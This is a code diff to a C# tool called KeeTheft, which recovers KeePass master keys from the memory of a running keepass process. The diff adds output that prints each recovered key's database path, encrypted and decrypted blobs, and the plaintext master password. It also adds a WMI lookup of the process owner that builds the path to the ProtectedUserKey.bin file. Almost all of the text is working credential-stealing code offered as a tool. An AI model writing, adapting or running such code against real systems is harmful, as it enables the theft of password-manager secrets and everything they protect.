@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.Threading;
 using KeeTheft.Extensions;
 using KeeTheft.KeyInfo;
+using System.Management;
 
 namespace KeeTheft
 {
@@ -13,13 +14,83 @@ namespace KeeTheft
         public static ILogger Logger = new NullLogger();
         static void Main(string[] args)
         {
-            Logger = new ConsoleLogger();
+            //Logger = new ConsoleLogger();
             Process[] Processes = Process.GetProcessesByName("keepass");
 
             foreach (var Proc in Processes)
             {
-                GetKeePassMasterKeys(Proc);
+                List<CompositeKeyInfo> results = GetKeePassMasterKeys(Proc);
+
+                foreach (CompositeKeyInfo result in results)
+                {
+                    foreach (IUserKey key in result.UserKeys) {
+
+                        Console.WriteLine();
+
+                        var keyType = key.GetType().Name;
+                        if(keyType == "KcpPassword")
+                        {
+                            Console.WriteLine("Database             : {0}", ((KcpPassword)key).databaseLocation);
+                        }
+                        else if (keyType == "KcpUserAccount")
+                        {
+                            Console.WriteLine("Database             : {0}", ((KcpUserAccount)key).databaseLocation);
+                        }
+                        else if (keyType == "KcpKeyFile")
+                        {
+                            Console.WriteLine("Database             : {0}", ((KcpKeyFile)key).databaseLocation);
+                        }
+                        
+                        Console.WriteLine("KeyType              : {0}", keyType);
+                        Console.WriteLine("KeePassVersion       : {0}", Proc.MainModule.FileVersionInfo.FileVersion);
+                        Console.WriteLine("ProcessID            : {0}", Proc.Id);
+                        Console.WriteLine("ExecutablePath       : {0}", Proc.MainModule.FileName);
+                        Console.WriteLine("EncryptedBlobAddress : {0}", key.encryptedBlobAddress);
+                        Console.WriteLine("EncryptedBlob        : {0}", BitConverter.ToString(key.encryptedBlob));
+                        Console.WriteLine("EncryptedBlobLen     : {0}", key.encryptedBlobLen);
+                        Console.WriteLine("PlaintextBlob        : {0}", BitConverter.ToString(key.plaintextBlob));
+
+                        if (keyType == "KcpPassword") {
+                            Console.WriteLine("Plaintext            : {0}", System.Text.Encoding.UTF8.GetString(key.plaintextBlob));
+                        }
+                        else
+                        {
+                            Console.WriteLine("Plaintext            : {0}", Convert.ToBase64String(key.plaintextBlob));
+                        }
+                        
+                        if(keyType == "KcpUserAccount")
+                        {
+                            string owner = GetProcessOwner(Proc.Id);
+
+                            if (!String.IsNullOrEmpty(owner))
+                            {
+                                var windowsPath = Environment.GetEnvironmentVariable("windir");
+                                var keyFilePath = String.Format("{0}\\Users\\{1}\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin", windowsPath.Split('\\')[0].Trim(), owner);
+                                Console.WriteLine("KeyFilePath          : {0}", keyFilePath);
+                            }
+                        }
+                    }
+                }
             }
+        }
+
+        public static string GetProcessOwner(int processId)
+        {
+            string query = "Select * From Win32_Process Where ProcessID = " + processId;
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
+            ManagementObjectCollection processList = searcher.Get();
+
+            foreach (ManagementObject obj in processList)
+            {
+                string[] argList = new string[] { string.Empty, string.Empty };
+                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
+                if (returnVal == 0)
+                {
+                    return argList[0];
+                }
+            }
+
+            return "";
         }
 
         public static List<CompositeKeyInfo> GetKeePassMasterKeys(Process Proc)
